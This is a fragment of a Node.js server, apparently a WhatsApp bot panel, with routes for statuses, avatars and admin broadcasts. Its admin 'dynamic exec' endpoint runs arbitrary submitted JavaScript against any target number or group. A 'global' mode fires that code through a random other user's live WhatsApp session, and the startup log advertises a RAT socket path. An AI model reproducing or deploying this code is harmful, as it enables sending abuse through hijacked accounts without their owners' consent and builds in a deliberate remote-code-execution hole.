  const st = list.find(s => s.id === statusId);
  if (st) {
    if (!st.viewers.includes(currentUser)) {
      st.viewers.push(currentUser);
      saveStatuses(list);
    }
  }
  res.json({ success: true });
});

app.post("/status/deleteMyStatus", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;
  const { statusId } = req.body;

  if (!statusId) return res.status(400).json({ error: "statusId required" });

  let list = loadStatuses();
  const st = list.find(s => s.id === statusId);
  if (!st) return res.status(404).json({ error: "Status not found" });
  if (st.username !== currentUser) return res.status(403).json({ error: "Not your status" });

  list = list.filter(s => s.id !== statusId);
  saveStatuses(list);

  if (st.type === 'image' && st.content && st.content.startsWith('/uploads/status/')) {
    const relPath = st.content.replace('/uploads/status/', '');
    const fullPath = path.join(__dirname, 'uploads', 'status', relPath);
    if (fs.existsSync(fullPath)) {
      try { fs.unlinkSync(fullPath); } catch (_) {}
    }
  }

  res.json({ success: true });
});

app.post("/uploadAvatar", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;
  const { image } = req.body;

  if (!image || typeof image !== 'string') return res.status(400).json({ error: "Image required" });

  const match = /^data:image\/(jpeg|png|webp);base64,(.+)$/.exec(image);
  if (!match) return res.status(400).json({ error: "Only JPEG/PNG/WebP base64 allowed" });

  const ext = match[1] === 'jpeg' ? 'jpg' : match[1];
  const buf = Buffer.from(match[2], 'base64');
  if (buf.length === 0) return res.status(400).json({ error: "Empty image" });
  if (buf.length > 4 * 1024 * 1024) return res.status(413).json({ error: "Image too large (max 4MB)" });

  const isJpeg = buf.length > 2 && buf[0] === 0xFF && buf[1] === 0xD8;
  const isPng = buf.length > 7 && buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4E && buf[3] === 0x47;
  const isWebp = buf.length > 11 && buf.slice(0, 4).toString('latin1') === 'RIFF' && buf.slice(8, 12).toString('latin1') === 'WEBP';
  if (!isJpeg && !isPng && !isWebp) return res.status(400).json({ error: "Invalid image data" });

  const dir = path.join(__dirname, 'uploads', 'avatars');
  fs.mkdirSync(dir, { recursive: true });
  const fname = 'av_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8) + '.' + ext;
  fs.writeFileSync(path.join(dir, fname), buf);

  const avatarUrl = '/uploads/avatars/' + fname;
  const db = loadDatabase();
  const userObj = db.find(u => u.username === currentUser);
  if (userObj) {
    if (userObj.avatar_url && userObj.avatar_url.startsWith('/uploads/avatars/')) {
      const oldPath = path.join(__dirname, 'uploads', 'avatars', userObj.avatar_url.replace('/uploads/avatars/', ''));
      if (fs.existsSync(oldPath)) {
        try { fs.unlinkSync(oldPath); } catch (_) {}
      }
    }
    userObj.avatar_url = avatarUrl;
    saveDatabase(db);
  }

  res.json({ success: true, avatar_url: avatarUrl });
});

app.post("/deleteAvatar", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;

  const db = loadDatabase();
  const userObj = db.find(u => u.username === currentUser);
  if (userObj && userObj.avatar_url) {
    if (userObj.avatar_url.startsWith('/uploads/avatars/')) {
      const oldPath = path.join(__dirname, 'uploads', 'avatars', userObj.avatar_url.replace('/uploads/avatars/', ''));
      if (fs.existsSync(oldPath)) {
        try { fs.unlinkSync(oldPath); } catch (_) {}
      }
    }
    userObj.avatar_url = null;
    saveDatabase(db);
  }
  res.json({ success: true });
});

// ===== ADMIN INFO SYSTEM =====
app.post("/admin/sendInfo", (req, res) => {
  const { key, message } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const sender = db.find(u => u.username === keyInfo.username);
  if (!sender || sender.role !== 'admin') {
    return res.status(403).json({ valid: false, message: "Admin only" });
  }
  
  const msgText = sanitize(message).trim();
  if (!msgText) {
    return res.status(400).json({ valid: false, message: "Message required" });
  }
  
  const infoMsg = {
    id: `info_${Date.now()}`,
    message: msgText,
    createdAt: new Date().toISOString(),
    sentBy: sender.username
  };
  
  infoList.push(infoMsg);
  saveAdminInfo();
  
  // Broadcast to all connected WebSocket clients
  for (const u in wsClients) {
    try {
      wsClients[u].send(JSON.stringify({
        type: 'new_info',
        data: infoMsg
      }));
    } catch (_) {}
  }
  
  console.log(`[ADMIN INFO] ${sender.username} sent: ${msgText.substring(0, 50)}`);
  res.json({ valid: true, message: "Info sent to all users", info: infoMsg });
});

app.get("/admin/getInfo", (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  
  res.json({
    valid: true,
    info: infoList.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
  });
});

app.delete("/admin/deleteInfo", (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'admin') {
    return res.status(403).json({ valid: false, message: "Admin only" });
  }

  const index = infoList.findIndex(item => item.id === id);
  if (index === -1) {
    return res.status(404).json({ valid: false, message: "Info not found" });
  }

  infoList.splice(index, 1);
  saveAdminInfo();

  for (const u in wsClients) {
    try {
      wsClients[u].send(JSON.stringify({ type: 'delete_info', data: { id } }));
    } catch (_) {}
  }

  console.log(`[ADMIN INFO] ${requester.username} deleted info ${id}`);
  res.json({ valid: true, deleted: true, id });
});

// ===== Start Express + Socket.IO Server =====
// ==========================================
// ADMIN DYNAMIC TEST FUNCTION ENDPOINTS
// ==========================================
app.get('/admin/test-function', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Test Function - DV API</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #0f0f13; color: #fff; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
    h2 { color: #00ffaa; border-bottom: 1px solid #333; padding-bottom: 10px; }
    .card { background: #1a1a24; border: 1px solid #333; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
    label { display: block; margin-top: 15px; margin-bottom: 5px; color: #aaa; }
    input[type="text"], select, textarea { 
      width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #444; color: #fff; 
      border-radius: 4px; box-sizing: border-box; font-family: inherit;
    }
    textarea { height: 150px; resize: vertical; }
    button { 
      background: #00ffaa; color: #000; font-weight: bold; padding: 12px 20px; 
      border: none; border-radius: 4px; cursor: pointer; margin-top: 20px; font-family: inherit;
    }
    button:hover { background: #00cc88; }
    .log-container { background: #000; border: 1px solid #333; padding: 15px; border-radius: 4px; height: 200px; overflow-y: auto; }
    .log-entry { margin: 5px 0; border-bottom: 1px dashed #222; padding-bottom: 5px; }
    .error { color: #ff4444; }
    .success { color: #00ffaa; }
    .info { color: #88aaff; }
    .header-controls { display: flex; justify-content: space-between; align-items: center; }
    .copy-btn { background: #333; color: #fff; padding: 5px 10px; font-size: 12px; margin-top: 0; margin-left: 10px; }
  </style>
</head>
<body>
  <h2>🛠️ Admin Test Function (Dynamic Exec)</h2>
  
  <div class="card">
    <label>Admin Session Key</label>
    <input type="text" id="sessionKey" placeholder="Paste your admin/owner sessionKey here">
    
    <label>Target Number (Format: 628xxx atau JID group)</label>
    <input type="text" id="target" placeholder="628xxxx / group code">
    
    <label>Sender Mode</label>
    <select id="senderMode">
      <option value="private">Private (Hanya socket akun ini)</option>
      <option value="global">Global (Random socket seluruh user - Admin Only)</option>
    </select>
    
    <label>Function Code (JavaScript)</label>
    <textarea id="codeBody" placeholder="// Tersedia variabel: sock, target&#10;// Contoh penggunaan:&#10;await sock.sendMessage(target, { text: 'Hello dari dynamic function' });"></textarea>
    
    <button onclick="executeTest()">🚀 Execute Function</button>
  </div>

  <div class="card">
    <div class="header-controls">
      <h3 style="margin: 0; color: #aaa;">Terminal Log</h3>
      <button class="copy-btn" onclick="copyLog()">📋 Salin Semua Log</button>
    </div>
    <div id="logBox" class="log-container">
      <div class="log-entry info">[System] Menunggu perintah...</div>
    </div>
  </div>

  <script>
    function addLog(msg, type = 'info') {
      const box = document.getElementById('logBox');
      const time = new Date().toLocaleTimeString();
      const div = document.createElement('div');
      div.className = 'log-entry ' + type;
      div.innerText = \`[\${time}] \${msg}\`;
      box.appendChild(div);
      box.scrollTop = box.scrollHeight;
    }

    function copyLog() {
      const logs = document.getElementById('logBox').innerText;
      navigator.clipboard.writeText(logs).then(() => {
        alert("Log berhasil disalin!");
      }).catch(err => {
        alert("Gagal salin: " + err);
      });
    }

    async function executeTest() {
      const key = document.getElementById('sessionKey').value;
      const target = document.getElementById('target').value;
      const senderMode = document.getElementById('senderMode').value;
      const code = document.getElementById('codeBody').value;

      if (!key || !target || !code) {
        return addLog("Error: Session Key, Target, dan Function Code wajib diisi!", "error");
      }

      addLog("Mengirim request eksekusi...", "info");
      
      try {
        const res = await fetch('/admin/execute-test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key, target, senderMode, code })
        });
        
        const data = await res.json();
        
        if (data.valid) {
          if (data.success) {
            addLog("Success: " + data.message, "success");
          } else {
            addLog("Execution Failed: " + data.message, "error");
            if (data.errorDetails) {
              addLog("Error Details:\\n" + data.errorDetails, "error");
            }
          }
        } else {
          addLog("Auth Error: " + data.message, "error");
        }
      } catch (err) {
        addLog("Network/System Error: " + err.message, "error");
      }
    }
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.post('/admin/execute-test', express.json(), async (req, res) => {
  const { key, target, senderMode, code } = req.body;

  if (!key || !target || !code) {
    return res.json({ valid: false, message: "Missing required fields" });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !['admin', 'owner'].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied. Admin or Owner only." });
  }

  let sock;
  let sMode = senderMode || 'private';

  try {
    if (sMode === 'global') {
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');
      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });
        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) availableSocks.push(activeConnections[sessionName]);
          });
        }
      }
      if (availableSocks.length === 0) {
        return res.json({ valid: true, success: false, message: "Global mode: No active sockets found." });
      }
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        return res.json({ valid: true, success: false, message: "Private mode: No active socket in your folder." });
      }
    }

    // Parse Target
    let targetJid = "";
    const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    if (groupRegex.test(target)) {
      const inviteCode = target.match(groupRegex)[1];
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        targetJid = groupInfo.id;
        try { await sock.groupAcceptInvite(inviteCode); } catch (e) {}
      } catch (e) {
        return res.json({ valid: true, success: false, message: "Invite group invalid / expired" });
      }
    } else if (target.endsWith("@g.us")) {
      targetJid = target;
    } else {
      const cleanNumber = target.replace(/\D/g, "");
      targetJid = cleanNumber + "@s.whatsapp.net";
    }

    // --- DYNAMIC EXECUTION ---
    console.log(`[🚀 DYNAMIC EXEC] User: ${user.username} | Target: ${targetJid} | Mode: ${sMode}`);
    
    // Create async function wrapper
    const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
    const dynamicFn = new AsyncFunction('sock', 'target', code);

    // Execute
    await dynamicFn(sock, targetJid);

    return res.json({ valid: true, success: true, message: "Code executed successfully." });

  } catch (err) {
    console.error("[❌ DYNAMIC EXEC ERROR]", err);
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Execution encountered an error.", 
      errorDetails: err.stack || err.message 
    });
  }
});
// ==========================================

server.listen(PORT, () => {
  console.log(`🚀 Express + Socket.IO aktif di http://localhost:${PORT}`);
  console.log(`🟣 RAT Socket.IO path: /rat-socket`);
  setupVipFolder();
  startUserSessions();

  // Kirim notifikasi jika baru selesai restart
  const restartFlag = path.join(__dirname, '.restart-flag');
  if (fs.existsSync(restartFlag)) {
    fs.rmSync(restartFlag, { force: true });
    bot.sendMessage(GROUP_BACKUP_CHAT_ID,
      "✨ *S Y S T E M   O N L I N E*\n\n" +
      "╭━━━━━━━━━━━━━━━━━━━╮\n" +
      "┃    ✅ *RESTART BERHASIL* ┃\n" +
      "┃  Server kembali aktif  ┃\n" +
      "┃  dan berjalan normal  ┃\n" +
      "╰━━━━━━━━━━━━━━━━━━━╯\n\n" +
      "▰▰▰▰▰▰▰▰▰▰ 100%\n" +
      "_Siap melayani lagi._",
      { parse_mode: "Markdown" }
    ).catch(() => {});
  }

  // 🆕 Jalankan Auto Refresh Timer
  console.log(`[AUTO REFRESH] Auto restart setiap 60 menit.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
  console.log(`[AUTO BACKUP] Diatur setiap 6 jam sekali ke ${BACKUP_CHAT_ID}.`);
  setTimeout(() => { performBackup().catch(() => {}); }, 10000);
  setInterval(() => performBackup().catch(() => {}), BACKUP_INTERVAL);
});
